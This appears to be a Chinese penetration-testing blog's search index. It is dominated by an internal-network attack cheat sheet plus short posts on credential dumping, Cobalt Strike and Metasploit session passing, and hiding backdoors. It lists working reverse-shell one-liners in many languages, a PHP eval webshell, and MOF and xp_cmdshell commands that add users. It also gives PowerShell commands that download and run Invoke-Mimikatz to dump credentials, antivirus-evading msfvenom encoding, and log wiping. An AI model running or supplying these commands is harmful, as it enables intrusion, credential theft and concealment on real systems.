@@ -1,0 +1,799 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>内网渗透</title>
+      <link href="/2020/01/07/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+      <url>/2020/01/07/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="1-1-windows"><a href="#1-1-windows" class="headerlink" title="1.1.windows"></a>1.1.windows</h3><ul><li><p>1.1.1用户操作</p><ul><li>query user #查看当前在线的用户<br>whoami #查看当前用户<br>net user #查看当前系统的用户<br>net1 user #查看当前系统的用户<br>net user /domain #查看当前域里面的用户<br>net user administrator    #查看当前用户的详细信息<br>net localgroup #查看本地用户组<br>net localgroup administrators #查看管理组中的成员</li></ul></li><li><p>1.1.2网络操作</p><ul><li>ipconfig /all #查看当前机器的ip<br>netstat -ano #查看有哪些网络连接端口<br>net view #查看在同一工作组中的机器<br>net view /domain #判断是否有域<br>route print #查看路由表<br>arp -a #查看arp表</li></ul></li><li><p>1.1.3系统操作</p><ul><li><p>set  #查看系统的环境变量<br>systeminfo  #查看当前操作系统信息，关注【补丁号】！！！！<br>tasklist #查看进程名称以及PID号<br>net start #查看服务</p></li><li><p>软件安装信息查询<br>dir /a “c:\program files” #查看当前系统的安装的软件<br>dir /a “c:\program files (x86)”</p></li><li><p>收集hash</p><ul><li><p>wce</p><ul><li>lassa.exe获取</li></ul></li><li><p>pwdum7</p><ul><li>lassa.exe获取</li></ul></li><li><p>mimikatz</p><ul><li>lassa.exe获取</li></ul></li><li><p>QuarksPwDump</p><ul><li>lassa.exe获取</li></ul></li><li><p>getpass</p><ul><li>SAM/system获取</li></ul></li><li><p>SAMinside</p><ul><li>SAM/system获取</li></ul></li><li><p>破解hash</p><ul><li><a href="https://www.objectif-securite.ch/en/ophcrack" target="_blank" rel="noopener">https://www.objectif-securite.ch/en/ophcrack</a></li></ul></li></ul></li></ul></li><li><p>1.1.4主动搜集</p><ul><li><p>搜索文件</p><ul><li>@echo off<br>set “FileName=password.txt”<br>echo searching..<br>for %%a in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (<br>if exist %%a:\ (<br>for /f “delims=” %%b in (‘dir /a-d /s /b “%%a:*%FileName%” 2^&gt;nul’) do (<br>if /i “%%~nxb” equ “%FileName%” (<br>echo,%%b<br>)<br>)<br>)<br>)</li></ul></li><li><p>判断主机存活</p><ul><li>@echo off<br>for /l %%i in (1 1 254) do ping -v 4 -n 1 192.168.5.%%i || find “TTL” &gt;&gt;hots.txt<br>pause</li></ul></li></ul></li><li><p>1.1.5用户习惯收集</p><ul><li><p>用户桌面信息收集    </p><ul><li>C:\Users\用户名\Desktop</li></ul></li><li><p>下载目录信息收集</p><ul><li>C:\Users\用户名\Download\</li><li>迅雷</li><li>百度云</li></ul></li><li><p>收藏夹信息收集</p><ul><li><p>chrome</p><ul><li>C:\Users\用户名\AppData\Local\Google\Chrome\User Data\Default</li></ul></li><li><p>ie</p><ul><li>C:\Users\用户名\Favorites</li></ul></li><li><p>firefox</p></li></ul></li><li><p>浏览器记录收集</p></li><li><p>聊天工具收集</p><ul><li>qq</li><li>微信</li></ul></li><li><p>系统日志收集</p><ul><li>登录日志</li><li>服务日志</li></ul></li></ul></li></ul><h3 id="1-2-linux"><a href="#1-2-linux" class="headerlink" title="1.2.linux"></a>1.2.linux</h3><ul><li><p>ifconfig<br>route #查看路由<br>whoami #<br>id #查看当前用户id<br>id test #查看test用户信息<br>w #查看当前系统活动用户<br>lastlog #查看用户登陆日志<br>grep MemTotal /proc/meminfo #查看系统内存总量</p></li><li><p>cat /etc/passwd #查看用户列表<br>cat /etc/shadow #获取用户hash<br>cat /etc/group #查看用户组<br>grep -v -E “^#” /etc/passwd | awk -F: ‘$3 == 0 { print $1}’   # 列出超级用户<br>awk -F: ‘($3 == “0”) {print}’ /etc/passwd   #列出超级用户</p></li><li><p>netstat –an<br>netstat -antlp #查看tcp连接</p></li><li><p>系统类型和内核版本<br>cat /etc/issue  #查看系统名称<br>cat /etc/lsb-release #查看系统名称、版本号<br>uname -a #查看内核信息<br>ls /root |grep vmlinuz #查看内核信息</p></li><li><p>进程信息<br>ps aux #查看进程信息<br>ps -ef</p></li><li><p>安装的软件包和服务<br>dpkg -l #查看安装的软件包<br>rpm -qa #查看安装的软件包<br>cat /etc/service #查看系统存在的服务</p></li><li><p>用户登录信息<br>/var/log/wtmp<br>/var/log/btmp</p></li><li><p>服务配置<br>cat /etc/syslog.conf<br>cat /etc/chttp.conf<br>cat /etc/lighttpd.conf<br>cat /etc/cups/cupsd.conf<br>cat /etc/inetd.conf<br>cat /etc/apache2/apache2.conf<br>cat /etc/my.conf<br>cat /etc/httpd/conf/httpd.conf<br>cat /opt/lampp/etc/httpd.conf</p></li><li><p>网络配置<br>cat /etc/network/interfaces #网卡配置<br>cat /etc/resolv.conf #dns配置<br>hostname #查看主机名</p></li><li><p>网络拓扑收集<br>arp –a</p></li><li><p>日志信息收集<br>/var/log/*</p><ul><li>http日志<br>/var/log/apache2/access.log</li><li>mysql日志<br>/var/log/mysql/error.log</li><li>apt日志<br>/var/log/apt/history.log</li></ul></li><li><p>/home目录文件信息收集</p></li></ul><h3 id="1-3第三方"><a href="#1-3第三方" class="headerlink" title="1.3第三方"></a>1.3第三方</h3><ul><li>ssh</li><li>ftp</li><li>mail</li><li>mysql</li><li>mssql</li></ul><h2 id="2-提权"><a href="#2-提权" class="headerlink" title="2.提权"></a>2.提权</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ul><li><p>系统漏洞，ms系列</p><ul><li><p>ms08-067</p><ul><li>rpc</li></ul></li><li><p>ms09-012</p><ul><li>pr.exe/巴西烤肉提权</li></ul></li><li><p>ms09-020</p><ul><li>iis5/6</li></ul></li><li><p>ms12-020</p><ul><li>rdp蓝屏</li></ul></li><li><p>ms17-010</p><ul><li>永恒之蓝/wannacry</li></ul></li><li><p>cve-2019-0708</p><ul><li>rdp/命令执行</li></ul></li><li><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></p></li><li><p><a href="https://docs.microsoft.com/zh-cn/security-updates/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/</a></p></li><li><p>粘滞键提权(sethc.exe)</p><ul><li>使用cmd.exe覆盖sethc.exe，当在输入密码界面多次shift时，会调用sethc.exe</li></ul></li></ul></li><li><p>应用程序</p><ul><li><p>pcanywhere</p></li><li><p>serv-U</p><ul><li>默认本地管理端口是：43958，默认管理员：LocalAdministrator，默认密码：#l@$ak#.lk;0@P</li></ul></li></ul></li></ul><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><ul><li><p>内核提权</p><ul><li><p>脏牛漏洞</p><ul><li>内核版本&gt;2.6</li></ul></li><li><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></p></li></ul></li></ul><h3 id="服务提权"><a href="#服务提权" class="headerlink" title="服务提权"></a>服务提权</h3><ul><li><p>mysql</p><ul><li><p>UDF提权</p><ul><li><p>windows</p><ul><li><p>UDF</p><ul><li>mysql版本 &lt; 5.1 , UDF导出到系统目录c:/windows/system32/</li><li>mysql版本 &gt; 5.1 ，UDF导出到安装路径MySQL\Lib\Plugin\</li></ul></li></ul></li><li><p>linux</p><ul><li>/usr/lib/mysql/plugin/</li></ul></li><li><p>要求有写权限，单引号未被过滤</p></li></ul></li><li><p>MOF</p><ul><li><p>windows专属</p><ul><li>流程：<br>1、 首先找个可写的目录，将我们的MOF文件上传上去。<br>2、 执行以下sql语句，mof文件内的命令便会执行。<br>select load_file(‘C:/wmpub/nullevt.mof’) into dumpfile ‘c:/windows/system32/wbem/mof/nullevt.mof’</li><li>mofcomp.exe xxxxx.mof 执行mof文件</li><li>调用Imofcompiler接口的$complieFile方法</li><li>#pragma namespace(“\\.\root\subscription”)<br>instance of __EventFilter as $EventFilter<br>{<br>EventNamespace = “Root\Cimv2”;<br>Name = “filtP2”;<br>Query = “Select * From __InstanceModificationEvent “<br>“Where TargetInstance Isa \”Win32_LocalTime\” “<br>“And TargetInstance.Second = 5”;<br>QueryLanguage = “WQL”;<br>};<br>instance of ActiveScriptEventConsumer as $Consumer<br>{<br>Name = “consPCSV2”;<br>ScriptingEngine = “JScript”;<br>ScriptText =<br>“var WSH = new ActiveXObject(\”WScript.Shell\”)\nWSH.run(\”net.exe user secist 123 /add\”)“;<br>};<br>instance of __FilterToConsumerBinding<br>{<br>Consumer = $Consumer;<br>Filter = $EventFilter;<br>};</li></ul></li></ul></li></ul></li><li><p>mssql</p><ul><li><p>xp_cmdshell</p><ul><li>开启：<br>EXEC sp_configure ‘show advanced options’, 1;<br>RECONFIGURE;<br>EXEC sp_configure ‘xp_cmdshell’, 1;<br>RECONFIGURE;</li><li>exec xp_cmdshell  ‘net user test test /add’</li></ul></li><li><p>xp_regwrite</p></li><li><p>xp_regread</p></li></ul></li><li><p>tomcat</p><ul><li>弱口令爆破</li></ul></li></ul><h2 id="3-权限维持"><a href="#3-权限维持" class="headerlink" title="3.权限维持"></a>3.权限维持</h2><h3 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h3><ul><li><p>cmd命令</p><ul><li><p>写webshell</p><ul><li>1.使用cmd命令写webshell，带有&lt;&gt;以及“空格”的时候，需要使用^进行转义<br>例如：echo ^&lt;?php^ eval($_POST[a]);?^&gt; &gt; shell.php</li></ul></li></ul></li></ul><h3 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h3><h3 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h3><ul><li><p>生成后门</p><ul><li>以管理员方式运行</li></ul></li></ul><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><ul><li>meterpreter</li><li>msfvenom</li><li>exploit</li></ul><h2 id="4-跨边界传输"><a href="#4-跨边界传输" class="headerlink" title="4.跨边界传输"></a>4.跨边界传输</h2><h3 id="跨边界代理-转发"><a href="#跨边界代理-转发" class="headerlink" title="跨边界代理/转发"></a>跨边界代理/转发</h3><ul><li><p>端口转发</p><ul><li><p>lcx</p><ul><li><p>listen</p><ul><li>-listen <local port1>  <local port2></li><li>将port1监听到的数据发往port2</li></ul></li><li><p>tran</p><ul><li>-tran   <local port>   <remote host>  <remote port></li><li>将本地port开启监听，并且将监听到的数据发往远程端口</li></ul></li><li><p>slave</p><ul><li>-slave  <remote host1> <remote port1> <remote host2> <remote port2></li><li>将远程主机A的port与远程主机B的port双向转发</li></ul></li></ul></li><li><p>frp反向代理</p><ul><li>frps -c frps.ini</li><li>frpc -c frpc.ini</li></ul></li></ul></li><li><p>内网代理</p><ul><li><p>http tunnel</p><ul><li><p>reDuh</p></li><li><p>reGeorg</p><ul><li>1.python2 安装urllib3库</li><li>2.上传tunnel.nosocket.php代理脚本到web服务器</li><li>3.访问url，确认web服务器上tunnel.nosocket.php能够执行</li><li>4.python2执行reGeorgSocksProxy.py脚本，连接tunnel.nosocket.php</li><li>5.配置本地代理，使用代理工具进行sock5代理</li></ul></li></ul></li><li><p>ssh tunnel</p><ul><li>xshell直接启动隧道转发</li><li>ssh -D设置socket隧道</li><li>ssh -L设置端口正向转发</li><li>ssh -R设置端口反向连接</li></ul></li><li><p>DNS tunnel</p><ul><li>dns2tcp</li></ul></li><li><p>pingtunnel</p><ul><li>服务端-type server</li><li>连接端-type client</li></ul></li></ul></li></ul><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><ul><li><p>1.nc</p><ul><li><p>正向连接</p><ul><li><p>攻击机</p><ul><li>nc -vv 受害者ip 受害者port</li></ul></li><li><p>受害者</p><ul><li>nc -lvvp 受害者port -e /bin/bash</li></ul></li></ul></li><li><p>反向连接</p><ul><li><p>攻击机</p><ul><li>nc -lvvp 攻击机port</li></ul></li><li><p>受害者</p><ul><li>nc -vv 攻击机ip 攻击机port -e /bin/bash</li></ul></li></ul></li><li><p>聊天/传文件</p><ul><li><p>发送方</p><ul><li>nc -lvvp 自己的port &lt; 文件</li></ul></li><li><p>接收方</p><ul><li>nc -vv 发送方ip 发送方port &gt; 文件</li></ul></li></ul></li></ul></li><li><p>2.bash</p><ul><li><p>接收端(hackip,公网)</p><ul><li>nc -lvvp 端口</li></ul></li><li><p>发送端(受害者）</p><ul><li>bash -i &gt;&amp; /dev/tcp/hackip/hack端口 0&gt;&amp;1 </li><li>0&lt;&amp;31-;exec 31&lt;&gt;/dev/tcp/hackip/hack端口;sh &lt;&amp;31 &gt;&amp;31 2&gt;&amp;31</li></ul></li></ul></li><li><p>3.socat</p><ul><li><p>tcp</p><ul><li><p>接收端(攻击机)</p><ul><li>socat TCP-LISTEN:端口 - </li></ul></li><li><p>发送端(靶机)</p><ul><li><p>linux</p><ul><li>socat exec:’bash -i’,pty,stderr,setsid,sigint,sane tcp:攻击机ip:攻击机端口</li></ul></li><li><p>windows</p><ul><li>socat.exe exec:’cmd.exe’,pty,stderr,setsid,sigint,sane tcp:攻击机ip:攻击机端口</li></ul></li></ul></li></ul></li><li><p>udp</p><ul><li><p>接收端(攻击机)</p><ul><li>socat udp-listen:端口 -</li></ul></li><li><p>发送端(靶机)</p><ul><li><p>linux</p><ul><li>socat udp-connect:ip:port exec:’bash -i’,pty,stderr,sane 2&gt;&amp;1&gt;/dev/null &amp;</li></ul></li><li><p>windows</p><ul><li>socat.exe udp-connect:192.168.5.108:30000 exec:’cmd.exe’,pty,stderr,sane</li></ul></li></ul></li></ul></li></ul></li><li><p>4.python</p><ul><li><p>接收端(攻击机)</p><ul><li>nc -lvvp port</li></ul></li><li><p>发送端(靶机)</p><ul><li>python -c  ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“接收端ip”,接收端端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</li></ul></li></ul></li><li><p>5.PHP反弹</p><ul><li><p>接收端(攻击机)</p><ul><li>nc -lvvp port</li></ul></li><li><p>发送端(靶机)</p><ul><li>php -r ‘$sock=fsockopen(“接收端ip”,接收端端口);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</li></ul></li></ul></li><li><p>6.JAVA反弹</p><ul><li><p>接收端(攻击机)</p><ul><li>nc -lvvp port</li></ul></li><li><p>发送端(靶机)</p><ul><li>r = Runtime.getRuntime() p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done”] as String[]) p.waitFor()</li></ul></li></ul></li><li><p>7.perl反弹</p><ul><li><p>接收端(攻击机)</p><ul><li>nc -lvvp port</li></ul></li><li><p>发送端(靶机)</p><ul><li>perl -e ‘use Socket;$i=”ip”;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</li></ul></li></ul></li><li><p>8.ruby反弹</p><ul><li><p>接收端(攻击机)</p><ul><li>nc -lvvp port</li></ul></li><li><p>发送端(靶机)</p><ul><li>ruby -r socket -e ‘exit if fork;c=TCPSocket.new(“ip”,”port”);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’</li></ul></li></ul></li><li><p>9.telnet反弹</p><ul><li><p>接收端(攻击机)</p><ul><li>nc -lvvp port</li></ul></li><li><p>发送端(靶机)</p><ul><li>mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</li></ul></li></ul></li><li><p>10.lua反弹</p><ul><li><p>接收端(攻击机)</p><ul><li>nc -lvvp port</li></ul></li><li><p>发送端(靶机)</p><ul><li>lua -e “local s=require(‘socket’);local t=assert(s.tcp());t:connect(‘ip’,port);while true do local r,x=t:receive();local f=assert(io.popen(r,’r’));local b=assert(f:read(‘*a’));t:send(b);end;f:close();t:close();”</li></ul></li></ul></li><li><p>11.awk</p><ul><li><p>接收端(攻击机)</p><ul><li>nc -lvvp port</li></ul></li><li><p>发送端(靶机)</p><ul><li>awk ‘BEGIN{s=”/inet/tcp/0/ip/port”;while(1){do{s|&amp;getline c;if(c){while((c|&amp;getline)&gt;0)print $0|&s;close(c)}}while(c!=”exit”);close(s)}}’</li></ul></li></ul></li><li><p>12.ksh/tsh/zsh/sh</p><ul><li><p>接收端(攻击机)</p><ul><li>nc -lvvp port</li></ul></li><li><p>发送端(靶机)</p><ul><li>ksh -c ‘ksh &gt;/dev/tcp/ip/port 2&gt;&amp;1 &lt;&amp;1’</li></ul></li></ul></li><li><p>13.通过msfvenom生成反弹shell的payload</p><ul><li>1.msfvenom -l payloads | grep 工具</li><li>2.msfvenom -p payload LHOST=监听机IP LPORT=监听端口</li></ul></li><li><p>14.icmpsh</p><ul><li><p>接收端</p><ul><li>./icmpsh-m.py <source IP address> <destination IP address></li></ul></li><li><p>发送端</p><ul><li>icpmsh.exe -t 接收端ip</li></ul></li></ul></li></ul><h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><ul><li>1.nc传输</li><li>2.上传点上传</li><li>3.wget下载</li><li>4.脚本php/python/perl/ruby发起请求并读写文件</li><li>5.ftp</li><li>6.sftp</li><li>7.svn</li><li>8.git</li><li>9.sync</li><li>10.powershell</li><li>11.net use 挂载盘符</li><li>12.bitsadmin</li><li>13.scp</li></ul><h2 id="5-隐匿攻击"><a href="#5-隐匿攻击" class="headerlink" title="5.隐匿攻击"></a>5.隐匿攻击</h2><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><ul><li><p>msfvenom</p><ul><li><p>encoder<br>编码器</p><ul><li><p>-e 编码器 -i 编码次数</p></li><li><p>多次编码</p><ul><li>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.5.172 lport=4444 -e x86/shikata_ga_nai -i 15 -f raw | msfvenom -a x86 –platform windows -e x86/alpha_upper -i 10 -f exe -o shell.exe</li></ul></li></ul></li><li><p>bad-chars<br>花指令</p><ul><li>-b ‘\x00’</li></ul></li></ul></li><li><p>the-backdoor-factory</p></li><li><p>veil</p></li><li><p>upx</p><ul><li>加壳</li></ul></li><li><p>.net壳</p></li><li><p>分离免杀</p><ul><li>shellcode提取，动态加载</li></ul></li></ul><h3 id="msf-cs"><a href="#msf-cs" class="headerlink" title="msf/cs"></a>msf/cs</h3><ul><li>msf发往cs</li><li>cs发往msf</li></ul><h2 id="6-横向移动"><a href="#6-横向移动" class="headerlink" title="6.横向移动"></a>6.横向移动</h2><h2 id="7-域渗透"><a href="#7-域渗透" class="headerlink" title="7.域渗透"></a>7.域渗透</h2><h3 id="瞄准域控-DC机-发起攻击"><a href="#瞄准域控-DC机-发起攻击" class="headerlink" title="瞄准域控(DC机)发起攻击"></a>瞄准域控(DC机)发起攻击</h3><h2 id="8-痕迹清理"><a href="#8-痕迹清理" class="headerlink" title="8.痕迹清理"></a>8.痕迹清理</h2><h3 id="windows-2"><a href="#windows-2" class="headerlink" title="windows"></a>windows</h3><h3 id="linux-2"><a href="#linux-2" class="headerlink" title="linux"></a>linux</h3><ul><li>/var/log/btmp</li><li>/var/log/wtmp</li><li>~/.bash_history</li><li>history -c</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 内网渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>利用powershell隐藏执行后门</title>
+      <link href="/2019/08/30/e5-88-a9-e7-94-a8powershell-e9-9a-90-e8-97-8f-e6-89-a7-e8-a1-8c-e5-90-8e-e9-97-a8/"/>
+      <url>/2019/08/30/e5-88-a9-e7-94-a8powershell-e9-9a-90-e8-97-8f-e6-89-a7-e8-a1-8c-e5-90-8e-e9-97-a8/</url>
+      
+        <content type="html"><![CDATA[<p>运行后门时，有些后门不能中断。双击运行这种后门会产生一个黑框。 一条命令就能使其在后台执行 <img src="http://112.74.49.123/wp-content/uploads/2019/08/1_1.png" alt=""> 命令解释： start-process启动一个进程 -windowstyle窗口样式 hidden隐藏</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>内网渗透：CS代理+proxychains+nmap进行内网扫描</title>
+      <link href="/2019/08/24/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-ef-bc-9acs-e4-bb-a3-e7-90-86proxychainsnmap-e8-bf-9b-e8-a1-8c-e5-86-85-e7-bd-91-e6-89-ab-e6-8f-8f/"/>
+      <url>/2019/08/24/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-ef-bc-9acs-e4-bb-a3-e7-90-86proxychainsnmap-e8-bf-9b-e8-a1-8c-e5-86-85-e7-bd-91-e6-89-ab-e6-8f-8f/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><p>前提：拿下边界机之后，进入内网，想用nmap怎么办？ CS可以开启代理，但是是socks4的代理，只能使用tcp协议，所以nmap使用的时候要使用-sT选择<em><strong>使用tcp</strong>_协议，要使用-Pn</em><strong>不使用ICMP</strong>_的ping确认主机存活 <img src="http://112.74.49.123/wp-content/uploads/2019/08/3_1.png" alt=""> <img src="http://112.74.49.123/wp-content/uploads/2019/08/3_2.png" alt=""></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>msf+cobaltstrike联动(二)：把cs中的机器spwan给msf</title>
+      <link href="/2019/08/24/msfcobaltstrike-e8-81-94-e5-8a-a8-e4-ba-8c-ef-bc-9a-e6-8a-8acs-e4-b8-ad-e7-9a-84-e6-9c-ba-e5-99-a8spwan-e7-bb-99msf/"/>
+      <url>/2019/08/24/msfcobaltstrike-e8-81-94-e5-8a-a8-e4-ba-8c-ef-bc-9a-e6-8a-8acs-e4-b8-ad-e7-9a-84-e6-9c-ba-e5-99-a8spwan-e7-bb-99msf/</url>
+      
+        <content type="html"><![CDATA[<p>前提：CS已经获取到session，可以进入图形化管理机器，现在需要使用msf进行进一步渗透，需要msf的metepreter。 开启msf <img src="http://112.74.49.123/wp-content/uploads/2019/08/2_1.png" alt=""> msf设置监听 <code>msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf exploit(handler) &gt; set lhost 192.168.3.117 lhost =&gt; 192.168.3.117 msf exploit(handler) &gt; set lport 2222 lport =&gt;2222 msf exploit(handler) &gt; exploit</code> <img src="http://112.74.49.123/wp-content/uploads/2019/08/2_2.png" alt=""> 在CS上开启监听，设置payload为windows/foreign/reverse_tcp host为msf的host port为msf的监听端口 <img src="http://112.74.49.123/wp-content/uploads/2019/08/2_3.png" alt=""> 在控制机器上右键选择Spawn <img src="http://112.74.49.123/wp-content/uploads/2019/08/2_4.png" alt=""> 选择Spwan之后会需要选择一个监听，选择刚创建的msf的监听 <img src="http://112.74.49.123/wp-content/uploads/2019/08/2_5.png" alt=""> 可以看到msf已经接收到cs上spwan过来的session <img src="http://112.74.49.123/wp-content/uploads/2019/08/2_6.png" alt=""></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>msf+cobaltstrike联动(一)：把msf的session发给cobaltstrike</title>
+      <link href="/2019/08/24/msfcobaltstrike-e8-81-94-e5-8a-a8-e4-b8-80-ef-bc-9a-e6-8a-8amsf-e7-9a-84session-e5-8f-91-e7-bb-99cobaltstrike/"/>
+      <url>/2019/08/24/msfcobaltstrike-e8-81-94-e5-8a-a8-e4-b8-80-ef-bc-9a-e6-8a-8amsf-e7-9a-84session-e5-8f-91-e7-bb-99cobaltstrike/</url>
+      
+        <content type="html"><![CDATA[<p>前提：MFS已经获取到session，可以进入metepreter，现在需要使用cobaltstrike进行图形化管理或团队协作。 cobaltstrike起一个beacon监听，如使用：windows/beacon_http/reverse_http 设置好host和port之后启动监听。 <img src="http://112.74.49.123/wp-content/uploads/2019/08/1.png" alt=""> MSF中使用 <code>use exploit/windows/local/payload_inject msf exploit(payload_inject) &gt; set payload windows/meterpreter/reverse_http msf exploit(payload_inject) &gt; set DisablePayloadHandler true msf exploit(payload_inject) &gt; set LHOST 192.168.3.117 msf exploit(payload_inject) &gt; set LPORT 10001 msf exploit(payload_inject) &gt; set SESSION 1</code> <img src="http://112.74.49.123/wp-content/uploads/2019/08/2.png" alt=""> 注：<code>set DisablePayloadHandler true</code> 作用是msf不监听，代表是用来返给其他监听的 <strong>都设置好后</strong> <code>msf exploit(payload_inject) &gt; run</code> 去CS端查看结果 <img src="http://112.74.49.123/wp-content/uploads/2019/08/3.png" alt=""> cs成功接收到msf中的session</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>windows下hash抓取的几种方式</title>
+      <link href="/2019/08/15/windows-e4-b8-8bhash-e6-8a-93-e5-8f-96-e7-9a-84-e5-87-a0-e7-a7-8d-e6-96-b9-e5-bc-8f/"/>
+      <url>/2019/08/15/windows-e4-b8-8bhash-e6-8a-93-e5-8f-96-e7-9a-84-e5-87-a0-e7-a7-8d-e6-96-b9-e5-bc-8f/</url>
+      
+        <content type="html"><![CDATA[<p>前提：在渗透测试过程中，对于windows系统的机器渗透需要注意hash的获取，其中hash分为LM-HASH与NTLM-HASH，在windows系统中，hash的默认存储位置为： <code>C:\Windows\System32\config\SAM</code></p><h2 id="各种工具："><a href="#各种工具：" class="headerlink" title="各种工具："></a>各种工具：</h2><ul><li><strong>mimikatz</strong> <code>privilege::debug sekurlsa::logonPasswords</code></li><li><strong>wce</strong> <code>wce.exe</code></li><li><strong>QuarkPwDump</strong> <code>QuarkPwDump.exe -dhl</code></li><li><strong>powershell脚本：</strong> 使用<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">powersploit</a>中的mimikatz.ps1 <strong><em>mimikatz</em></strong> <strong><em>在线加载：</em></strong> <code>powershell -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://ip/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -Dumpcreds&quot;</code> <strong><em>本地加载：</em></strong> <code>powershell -exec bypass &quot;import-module Invoke-Mimikatz.ps1;Invoke-Mimikatz -Dumpcreds&quot;</code></li></ul><p><strong><em>Ninja-copy</em></strong> <strong><em>在线加载：</em></strong> <code>powershell -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://ip/Invoke-NinjaCopy.ps1&#39;);Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination C:\SAM.txt;&quot;</code> <strong><em>本地加载：</em></strong> <code>powershell -exec bypass &quot;Import-Module .\Invoke-NinjaCopy.ps1;Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive&quot;</code> 后记：为防止防火墙，杀软等工具杀掉ps1脚本，推荐使用在线加载的方式，文件不落地。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>python查看本地库用法</title>
+      <link href="/2019/08/07/python-e6-9f-a5-e7-9c-8b-e6-9c-ac-e5-9c-b0-e5-ba-93-e7-94-a8-e6-b3-95/"/>
+      <url>/2019/08/07/python-e6-9f-a5-e7-9c-8b-e6-9c-ac-e5-9c-b0-e5-ba-93-e7-94-a8-e6-b3-95/</url>
+      
+        <content type="html"><![CDATA[<p><code>python -m pydoc -p 0</code> 使用后会生成个localhost上随机端口的web服务，直接访问即可 <img src="http://112.74.49.123/wp-content/uploads/2019/08/python%E5%BA%93.png" alt=""></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> python程序设计 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>python使用isoparser模块获取iso镜像文件内容</title>
+      <link href="/2019/08/07/python-e4-bd-bf-e7-94-a8isoparser-e6-a8-a1-e5-9d-97-e8-8e-b7-e5-8f-96iso-e9-95-9c-e5-83-8f-e6-96-87-e4-bb-b6-e5-86-85-e5-ae-b9/"/>
+      <url>/2019/08/07/python-e4-bd-bf-e7-94-a8isoparser-e6-a8-a1-e5-9d-97-e8-8e-b7-e5-8f-96iso-e9-95-9c-e5-83-8f-e6-96-87-e4-bb-b6-e5-86-85-e5-ae-b9/</url>
+      
+        <content type="html"><![CDATA[<p><code>import isoparser iso = isoparser.parse(&quot;路径&quot;) print iso.record(&quot;boot&quot;, &quot;grub&quot;).children #获取子路径内的文件目录 print iso.record(&quot;boot&quot;, &quot;grub&quot;, &quot;grub.cfg&quot;).content #获取文件内容</code> eg: <img src="http://112.74.49.123/wp-content/uploads/2019/08/iso%E5%BA%93.png" alt="获取kali镜像内的文件"></p>]]></content>
+      
+      
+      <categories>
+          
